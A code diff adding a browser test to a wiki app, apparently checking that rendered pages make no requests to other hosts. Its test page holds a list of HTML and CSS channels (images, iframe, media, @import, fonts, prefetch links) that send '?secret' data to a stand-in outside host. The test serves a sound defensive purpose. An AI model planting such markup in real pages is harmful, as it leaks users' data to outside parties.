@@ -78,3 +78,35 @@ def test_a_tasks_id_is_text_on_its_card(page, wiki):
     expect(page.locator(".task-item")).to_have_count(2)
     expect(page.locator("#evil, #evil2, #evil3")).to_have_count(0)
     assert page.locator(".task-item").first.get_attribute("data-id") in (evil, "done-1")
+
+
+def test_a_page_asks_no_other_host_for_anything(page, wiki):
+    # Whatever a page's HTML names elsewhere, the browser asks for none of
+    # it (the harness fails a test with a request to another host): each is
+    # a way to send text away. A markdown image elsewhere is a link.
+    there = "https://elsewhere.example"
+    wiki.write("leaky", "# Leaky\n\n"
+               f"![a cat]({there}/cat.png?secret)\n\n"
+               f'<img id="raw-img" src="{there}/raw.png?secret">\n\n'
+               f'<iframe id="raw-frame" src="{there}/frame?secret"></iframe>\n\n'
+               f'<video src="{there}/v.mp4?secret"></video> <audio src="{there}/a.mp3?secret"></audio>\n\n'
+               f'<style>@import url("{there}/s.css?secret"); #x {{ background: url({there}/bg.png?secret) }}'
+               f' @font-face {{ font-family: f; src: url({there}/f.woff2?secret) }} #x {{ font-family: f }}</style>\n\n'
+               f'<div id="x" style="background-image: url({there}/inline.png?secret)">styled</div>\n\n'
+               f'<link rel="stylesheet" href="{there}/l.css?secret">\n'
+               f'<link rel="prefetch" href="{there}/p?secret">\n\n'
+               "```python\nx = 1\n```\n\n$e^{i\\pi}$\n")
+    page.goto("/page/leaky")
+    expect(page.locator("article.page-content pre code.hljs")).to_have_count(1)   # Zone's own still work
+    expect(page.locator("article.page-content .katex")).to_have_count(1)
+    link = page.locator("article.page-content a.external-image")
+    expect(link).to_have_text("a cat")
+    expect(link).to_have_attribute("href", f"{there}/cat.png?secret")
+    expect(page.locator("article.page-content link")).to_have_count(0)
+    page.wait_for_timeout(500)
+    assert page.external_requests == []
+    assert page.csp_violations   # the raw ones, blocked
+    page.csp_violations.clear()
+    # The harness's own script, run in the frame's blocked (empty) document.
+    assert all("sessionStorage" in e for e in page.js_errors)
+    page.js_errors.clear()
